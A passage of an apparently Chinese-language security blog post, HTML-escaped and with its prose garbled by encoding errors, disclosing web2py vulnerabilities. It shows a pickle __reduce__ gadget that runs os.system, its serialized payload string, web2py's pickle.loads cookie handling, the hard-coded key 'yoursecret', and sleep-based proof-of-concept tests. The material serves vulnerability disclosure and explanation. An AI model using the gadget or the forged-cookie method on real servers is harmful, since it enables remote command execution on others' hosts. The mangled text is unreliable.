&lt;p&gt;ç›´æ¥èˆ‰å€‹ Pickle çš„ä¾‹å­å¦‚ä¸‹ï¼Œæˆ‘å€‘è£½é€ äº†ä¸€å€‹æœƒåŸ·è¡Œç³»çµ±æŒ‡ä»¤ &lt;code class=&quot;highlighter-rouge&quot;&gt;echo success&lt;/code&gt; çš„ç‰©ä»¶ &lt;code class=&quot;highlighter-rouge&quot;&gt;Malicious&lt;/code&gt;ï¼Œä¸¦ä¸”åºåˆ—åŒ–æˆå­—ä¸² &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;cposix\nsystem\np1\n(S&#39;echo success&#39;\np2\ntp3\nRp4\n.&quot;&lt;/code&gt;ã€‚ç•¶å—å®³è€…ååºåˆ—åŒ–é€™å€‹å­—ä¸²ï¼Œå³è§¸ç™¼åŸ·è¡Œè©²ç³»çµ±æŒ‡ä»¤ï¼Œå› æ­¤å°å‡º &lt;code class=&quot;highlighter-rouge&quot;&gt;success&lt;/code&gt;ã€‚&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;cPickle&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Malicious&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__reduce__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;echo success&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,))&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serialize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cPickle&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dumps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Malicious&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serialize&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&amp;quot;cposix&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;(S&amp;#39;echo success&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;tp3&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Rp4&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;.&amp;quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cPickle&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;é€™å°±æ˜¯ Pickle èª¤ç”¨ååºåˆ—åŒ–æ‰€é€ æˆçš„å‘½ä»¤åŸ·è¡Œé¢¨éšªã€‚æ”»æ“Šè€…å¾ˆå®¹æ˜“å¯ä»¥ç”¢ç”Ÿä¸€å€‹å«æœ‰ä»»æ„å‘½ä»¤åŸ·è¡Œçš„åºåˆ—åŒ–å­—ä¸²ï¼Œé€²è€Œè®“å—å®³è€…åœ¨é€²è¡Œååºåˆ—åŒ–çš„éç¨‹ä¸­è§¸ç™¼åŸ·è¡Œæƒ¡æ„å‘½ä»¤ã€‚&lt;/p&gt;

&lt;h3 id=&quot;ååºåˆ—åŒ–--åºåˆ—åŒ–å­—ä¸²å¯æ§&quot;&gt;ååºåˆ—åŒ– ï¼‹ åºåˆ—åŒ–å­—ä¸²å¯æ§&lt;/h3&gt;

&lt;p&gt;æœ¬æ¬¡ç™¼ç¾çš„å•é¡Œä¸»è¦ä¾†è‡ª web2py æœ¬èº«çš„ session cookie ä½¿ç”¨ Pickle è™•ç†åºåˆ—åŒ–éœ€æ±‚ (CVE-2016-3957)ï¼Œè€Œä¸”å› ç‚º session cookie çš„åŠ å¯†å­—ä¸²å›ºå®š (CVE-2016-3953)ï¼Œæ”»æ“Šè€…å¯ä»»æ„å½é€ æƒ¡æ„çš„åºåˆ—åŒ–å­—ä¸²é€ æˆå‰é¢æ‰€ä»‹ç´¹çš„å‘½ä»¤åŸ·è¡Œé¢¨éšªã€‚ç´°ç¯€å¦‚ä¸‹ã€‚&lt;/p&gt;

&lt;h4 id=&quot;cve-2016-3957&quot;&gt;CVE-2016-3957&lt;sup id=&quot;fnref:note1&quot;&gt;&lt;a href=&quot;#fn:note1&quot; class=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/h4&gt;

&lt;p&gt;web2py çš„æ‡‰ç”¨ç¨‹å¼å¦‚æœä½¿ç”¨ cookie ä¾†å„²å­˜ session è³‡è¨Šï¼Œé‚£éº¼åœ¨æ¯æ¬¡æ¥åˆ°ä½¿ç”¨è€…è«‹æ±‚æ™‚æœƒå°‡ session cookie ç”¨ä¸€å€‹ secure_loads å‡½å¼å°‡ cookie å…§å®¹è®€å…¥ã€‚ [&lt;a href=&quot;https://github.com/web2py/web2py/blob/R-2.14.1/gluon/globals.py#L846&quot;&gt;Ref&lt;/a&gt;]&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;gluon/globals.py#L846&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session_storage_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;cookie&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;c&quot;&gt;# check if there is session data in cookies&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session_data_name&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;session_cookie_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session_data_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;session_cookie_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session_cookie_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;secure_loads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session_cookie_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookie_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                    &lt;span class=&quot;n&quot;&gt;compression_level&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;compression_level&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                    &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;secure_loads å‡½å¼å…§å®¹å¦‚ä¸‹ï¼Œåœ¨ä¸€é€£ä¸²è§£å¯†å¾Œæœƒç”¨ pickle.loads æ–¹æ³•å°‡è§£å¯†å…§å®¹ååºåˆ—åŒ–ï¼Œåœ¨é€™è£¡ç¢ºå®š cookie å…§å®¹æœƒä½¿ç”¨ Pickle è™•ç†ã€‚[&lt;a href=&quot;https://github.com/web2py/web2py/blob/R-2.14.1/gluon/utils.py#L200&quot;&gt;Ref&lt;/a&gt;]&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;gluon/utils.py#L200&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;secure_loads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encryption_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hash_key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;compression_level&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;:&amp;#39;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hash_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;hash_key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sha1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encryption_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hexdigest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;signature&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypted_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;:&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;actual_signature&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hmac&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hash_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypted_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hexdigest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;compare&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signature&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;actual_signature&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encryption_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;encrypted_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urlsafe_b64decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encrypted_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;IV&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypted_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypted_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypted_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;cipher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AES_new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IV&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IV&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cipher&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encrypted_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rstrip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;compression_level&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zlib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decompress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pickle&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  &lt;span class=&quot;c&quot;&gt;# &amp;lt;-- Bingo!!!&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;ne&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;å› æ­¤ï¼Œå¦‚æœçŸ¥é“é€£ç·šä¸­ç”¨ä»¥åŠ å¯† cookie å…§å®¹çš„ encryption_keyï¼Œæ”»æ“Šè€…å°±å¯ä»¥å½é€  session cookieï¼Œé€²è€Œåˆ©ç”¨ pickle.loads é€²è¡Œé ç«¯å‘½ä»¤åŸ·è¡Œã€‚&lt;/p&gt;

&lt;h4 id=&quot;cve-2016-3953&quot;&gt;CVE-2016-3953&lt;/h4&gt;

&lt;p&gt;å¾ˆå¹¸é‹çš„ï¼Œæˆ‘å€‘ç™¼ç¾ web2py é è¨­é–‹å•Ÿçš„ç¯„ä¾‹æ‡‰ç”¨ç¨‹å¼æ˜¯ä½¿ç”¨ session cookieï¼Œä¸¦ä¸”æœ‰ä¸€å€‹å¯«æ­»çš„å¯†é‘°ï¼š&lt;code class=&quot;highlighter-rouge&quot;&gt;yoursecret&lt;/code&gt;ã€‚[&lt;a href=&quot;https://github.com/web2py/web2py/blob/R-2.14.1/applications/examples/models/session.py&quot;&gt;Ref&lt;/a&gt;]&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;applications/examples/models/session.py&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookie_key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;yoursecret&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;å› æ­¤ï¼Œweb2py çš„ä½¿ç”¨è€…å¦‚æœæ²’æœ‰æ‰‹å‹•é—œé–‰ç¯„ä¾‹æ‡‰ç”¨ç¨‹å¼ï¼Œæ”»æ“Šè€…å°±å¯ä»¥ç›´æ¥åœ¨ http://[target]/examples/ é é¢ç™¼å‹•æ”»æ“Šå–å¾—ä¸»æ©Ÿæ“ä½œæ¬Šã€‚&lt;/p&gt;

&lt;h4 id=&quot;proof-of-concept&quot;&gt;Proof of Concept&lt;/h4&gt;

&lt;p&gt;æˆ‘å€‘å˜—è©¦ç”¨ &lt;code class=&quot;highlighter-rouge&quot;&gt;yoursecret&lt;/code&gt; ä½œç‚º encryption_key å½é€ ä¸€å€‹åˆæ³•çš„ session cookieï¼Œä¸¦å°‡ä¸€å€‹æœƒåŸ·è¡Œç³»çµ±æŒ‡ä»¤ sleep çš„ç‰©ä»¶å¡å…¥å…¶ä¸­ã€‚å¸¶è‘—æ­¤ session cookie é€£å…¥ web2py å®˜ç¶²ç¯„ä¾‹æ‡‰ç”¨ç¨‹å¼(http://www.web2py.com/examples)ï¼Œæƒ…å½¢å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;p&gt;ç•¶æ’å…¥çš„ç‰©ä»¶æœƒåŸ·è¡ŒæŒ‡ä»¤ sleep 3 æ™‚ï¼Œç¶²ç«™å›æ‡‰æ™‚é–“ç‚º 6.8 ç§’&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20170103/POC1.png&quot; alt=&quot;POC1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ç•¶æ’å…¥çš„ç‰©ä»¶æœƒåŸ·è¡ŒæŒ‡ä»¤ sleep 5 æ™‚ï¼Œç¶²ç«™å›æ‡‰æ™‚é–“ç‚º 10.8 ç§’&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20170103/POC2.png&quot; alt=&quot;POC2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ç¢ºå¯¦æœƒå› ç‚ºå¡å…¥çš„ session cookie å€¼ä¸åŒè€Œæœ‰æ‰€å»¶é²ï¼Œè­‰æ˜ç¶²ç«™çš„ç¢ºåŸ·è¡Œäº†ï¼ˆå…©æ¬¡ï¼‰æˆ‘å€‘å½é€ çš„ç‰©ä»¶å…§å®¹ã€‚&lt;sup id=&quot;fnref:note2&quot;&gt;&lt;a href=&quot;#fn:note2&quot; class=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;

&lt;h3 id=&quot;å…¶ä»–æ´©æ¼å°è‡´-rce&quot;&gt;å…¶ä»–æ´©æ¼å°è‡´ RCE&lt;/h3&gt;

&lt;p&gt;æ­¤å¤–ï¼Œåœ¨ web2py ç¯„ä¾‹æ‡‰ç”¨ç¨‹å¼ç‚ºäº†ç¤ºç¯„æ¡†æ¶çš„ç‰¹æ€§ï¼Œå› æ­¤æ´©æ¼äº†è¨±å¤šç’°å¢ƒè®Šæ•¸ã€‚å…¶ä¸­æœ‰å…©å€‹è®Šæ•¸è¼ƒç‚ºæ•æ„Ÿï¼Œé–“æ¥ä¹Ÿæœƒå°è‡´ç«¯å‘½ä»¤åŸ·è¡Œï¼Œåˆ†åˆ¥å¦‚ä¸‹ã€‚&lt;/p&gt;

&lt;h4 id=&quot;cve-2016-3954&quot;&gt;CVE-2016-3954&lt;/h4&gt;

&lt;p&gt;åœ¨ http://[target]/examples/simple_examples/status é é¢ä¸­ï¼Œresponse åˆ†é å…§å®¹æ´©æ¼äº† session_cookie_key å€¼ã€‚é€™å€‹å€¼å°±æ˜¯ç”¨ä¾†åŠ å¯†å‰é¢æ‰€ä»‹ç´¹çš„ session cookieï¼Œæ­é… CVE-2016-3957 Pickle çš„å•é¡Œå¯ç›´æ¥é ç«¯å‘½ä»¤åŸ·è¡Œã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20170103/CVE-2016-3954.png&quot; alt=&quot;CVE-2016-3954&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ç„¡è«–ä½¿ç”¨è€…æ˜¯å¦è‡ªè¡Œæ›´æ”¹ session_cookie_keyï¼Œæˆ–æ˜¯è©²å€¼æ˜¯ç³»çµ±éš¨æ©Ÿç”¢ç”Ÿã€‚æ­¤ä»‹é¢ä»ç„¶å¯ä»¥å–å¾—æ©Ÿæ•è³‡è¨Šè—‰ä»¥é€ æˆå±å®³ã€‚&lt;/p&gt;

